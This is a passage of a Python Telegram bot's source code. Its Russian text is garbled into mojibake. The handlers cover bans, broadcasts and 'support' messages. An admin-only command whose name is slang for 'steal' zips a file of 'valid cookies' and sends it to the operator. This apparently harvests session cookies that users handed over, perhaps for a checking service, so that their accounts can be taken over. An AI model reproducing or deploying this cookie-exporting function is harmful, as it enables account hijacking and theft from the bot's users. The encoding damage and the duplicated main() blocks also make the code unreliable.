                text="<b>‚úÖ –í–ê–®–ê –ë–õ–û–ö–ò–†–û–í–ö–ê –°–ù–Ø–¢–ê</b>\n\n–¢–µ–ø–µ—Ä—å –≤—ã —Å–Ω–æ–≤–∞ –º–æ–∂–µ—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º.",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} –æ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–µ: {e}")
        
        await message.answer(
            f"<b>‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @{username} (ID: {user_id}) —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.</b>",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.answer(
            f"<b>‚ùå –û—à–∏–±–∫–∞ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("banlist"))
async def banlist(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    banned_users = Database.load_banned_users()
    if not banned_users:
        await message.answer("<b>‚ùå –°–ø–∏—Å–æ–∫ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø—É—Å—Ç.</b>", parse_mode=ParseMode.HTML)
        return
    
    banlist_message = "<b>ü§î –°–ü–ò–°–û–ö –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–ù–´–• –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–ï–ô</b>\n\n"
    for index, (user_id, ban_info) in enumerate(banned_users.items(), start=1):
        banlist_message += (
            f"{index}. <b>ID:</b> {user_id}\n"
            f"<b>–ü—Ä–∏—á–∏–Ω–∞:</b> {ban_info.get('reason', '–ù–µ —É–∫–∞–∑–∞–Ω–∞')}\n"
            f"<b>–î–∞—Ç–∞:</b> {ban_info.get('date', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}\n"
            f"ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
        )
    
    await message.answer(banlist_message, parse_mode=ParseMode.HTML)

@router.message(Command("post"))
async def post_message(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Ñ–æ—Ç–æ
    has_photo = bool(message.photo)
    text = message.caption if has_photo else message.text.split("/post", 1)[1].strip()
    
    if not text and not has_photo:
        await message.answer("<b>‚ùå –¢–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º.</b>", parse_mode=ParseMode.HTML)
        return
    
    users = Database.get_all_users()
    total_users = len(users)
    success = 0
    failed = 0
    
    progress_msg = await message.answer(
        f"<b>üì¢ –ù–ê–ß–ê–¢–ê –†–ê–°–°–´–õ–ö–ê</b>\n\n"
        f"<b>–ü–æ–ª—É—á–∞—Ç–µ–ª–µ–π:</b> {total_users}\n"
        f"<b>–°—Ç–∞—Ç—É—Å:</b> 0/{total_users}\n"
        f"<b>–£—Å–ø–µ—à–Ω–æ:</b> 0\n"
        f"<b>–ù–µ —É–¥–∞–ª–æ—Å—å:</b> 0",
        parse_mode=ParseMode.HTML
    )
    
    for user_id in users:
        try:
            if has_photo:
                photo = message.photo[-1].file_id
                await bot.send_photo(
                    chat_id=user_id,
                    photo=photo,
                    caption=text,
                    parse_mode=ParseMode.HTML
                )
            else:
                await bot.send_message(
                    chat_id=user_id,
                    text=text,
                    parse_mode=ParseMode.HTML
                )
            success += 1
        except Exception as e:
            failed += 1
            logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}: {e}")
        
        if (success + failed) % 10 == 0 or (success + failed) == total_users:
            try:
                await progress_msg.edit_text(
                    f"<b>üì¢ –†–ê–°–°–´–õ–ö–ê</b>\n\n"
                    f"<b>–ü–æ–ª—É—á–∞—Ç–µ–ª–µ–π:</b> {total_users}\n"
                    f"<b>–°—Ç–∞—Ç—É—Å:</b> {success + failed}/{total_users}\n"
                    f"<b>–£—Å–ø–µ—à–Ω–æ:</b> {success}\n"
                    f"<b>–ù–µ —É–¥–∞–ª–æ—Å—å:</b> {failed}",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
    
    await message.answer(
        f"<b>üìä –†–ê–°–°–´–õ–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê</b>\n\n"
        f"<b>–í—Å–µ–≥–æ –ø–æ–ª—É—á–∞—Ç–µ–ª–µ–π:</b> {total_users}\n"
        f"<b>–£—Å–ø–µ—à–Ω–æ –¥–æ—Å—Ç–∞–≤–ª–µ–Ω–æ:</b> {success}\n"
        f"<b>–ù–µ —É–¥–∞–ª–æ—Å—å –¥–æ—Å—Ç–∞–≤–∏—Ç—å:</b> {failed}\n\n"
        f"<b>–ü—Ä–æ—Ü–µ–Ω—Ç —É—Å–ø–µ—à–Ω—ã—Ö:</b> {round(success/total_users*100, 2)}%",
        parse_mode=ParseMode.HTML
    )

@router.message(Command("spizdit"))
async def spizdit_cookies(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        valid_cookies_file = 'all_valid_cookies.txt'
        
        if not os.path.exists(valid_cookies_file) or os.path.getsize(valid_cookies_file) == 0:
            await message.answer("<b>‚ùå –§–∞–π–ª —Å –≤–∞–ª–∏–¥–Ω—ã–º–∏ –∫—É–∫–∞–º–∏ –ø—É—Å—Ç –∏–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.</b>", parse_mode=ParseMode.HTML)
            return
        
        zip_file_path = 'valid_cookies.zip'
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(valid_cookies_file, arcname=os.path.basename(valid_cookies_file))
        
        await message.answer_document(
            document=FSInputFile(zip_file_path),
            caption="<b>üìÅ –§–∞–π–ª —Å –≤–∞–ª–∏–¥–Ω—ã–º–∏ –∫—É–∫–∞–º–∏:</b>",
            parse_mode=ParseMode.HTML
        )
        
        os.remove(zip_file_path)
        
    except Exception as e:
        await message.answer(
            f"<b>‚ùå –û—à–∏–±–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞ –∫—É–∫–∏:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
        logging.error(f"–û—à–∏–±–∫–∞ –≤ /spizdit: {e}")

@router.message(Command("soob"))
async def send_personal_message(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        # –†–∞–∑–±–∏—Ä–∞–µ–º –∫–æ–º–∞–Ω–¥—É
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            await message.answer(
                "<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã.</b>\n"
                "<b>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ:</b> <code>/soob @username –∏–ª–∏ ID —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è</code>\n\n"
                "<i>–ü—Ä–∏–º–µ—Ä:</i> <code>/soob 12345678 –ü—Ä–∏–≤–µ—Ç, –∫–∞–∫ –¥–µ–ª–∞?</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        text = args[2]
        
        # –ò—â–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        if target.isdigit():
            user_id = int(target)
            username = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
        else:
            user_id = None
            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if config.get('username') == target:
                    user_id = user
                    username = target
                    break
        
        if not user_id:
            await message.answer(f"<b>‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @{target} –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode=ParseMode.HTML)
            return
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–æ–π "–°–∫—Ä—ã—Ç—å"
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚ùå –°–∫—Ä—ã—Ç—å", callback_data=f"hide_msg_{message.from_user.id}")]
        ])
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        if message.photo:
            photo = message.photo[-1].file_id
            await bot.send_photo(
                chat_id=user_id,
                photo=photo,
                caption=f"<b>üì¨ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏:</b>\n\n"
                       f"<i>„Äù{text}„Äû</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        else:
            await bot.send_message(
                chat_id=user_id,
                text=f"<b>üì¨ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏:</b>\n\n"
                     f"<i>„Äù{text}„Äû</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        
        await message.answer(
            f"<b>‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é @{username} (ID: {user_id})</b>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await message.answer(
            f"<b>‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message()
async def check_ban(message: Message):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(
            f"<b>‚ùå –í–´ –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–´</b>\n\n"
            f"ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
            f"–ü—Ä–∏—á–∏–Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏: <b>{reason}</b>\n\n"
            f"–ï—Å–ª–∏ –≤—ã —Å—á–∏—Ç–∞–µ—Ç–µ, —á—Ç–æ —ç—Ç–æ –æ—à–∏–±–∫–∞, —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.",
            parse_mode=ParseMode.HTML
        )
        return
    
    await message.answer(
        "<b>‚ùå–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞‚ùå</b>\n\n"
        "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start –¥–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã —Å –±–æ—Ç–æ–º.",
        parse_mode=ParseMode.HTML
    )

async def main():
    await Database.send_startup_message()  # –í—ã–∑—ã–≤–∞–µ–º –º–µ—Ç–æ–¥ –∫–ª–∞—Å—Å–∞
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—á–µ—Ä–µ–¥–∏ –≤ —Ñ–æ–Ω–µ
    global queue_task, validator_task
    queue_task = asyncio.create_task(process_queue())
    active_tasks.add(queue_task)
    
    validator_task = asyncio.create_task(process_validator_queue())
    validator_active_tasks.add(validator_task)
    
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler("bot.log"),
            logging.StreamHandler()
        ]
    )
    
    logging.info("–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞...")
    asyncio.run(main())

import asyncio

async def main():
    global queue_task, validator_task

    # –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –æ—á–µ—Ä–µ–¥–µ–π
    queue_task = asyncio.create_task(process_queue())
    validator_task = asyncio.create_task(process_validator_queue())

    # –ü–æ–¥–∫–ª—é—á–∞–µ–º —Ä–æ—É—Ç–µ—Ä—ã
    dp.include_router(router)

    # –ü—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è –æ –∑–∞–ø—É—Å–∫–µ
    try:
        await Database.send_startup_message()
    except Exception as e:
        logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å startup —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")

    # –ó–∞–ø—É—Å–∫–∞–µ–º –ª–æ–Ω–≥–ø–æ–ª–ª–∏–Ω–≥
    await dp.start_polling(bot)


if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s"
    )
    asyncio.run(main())
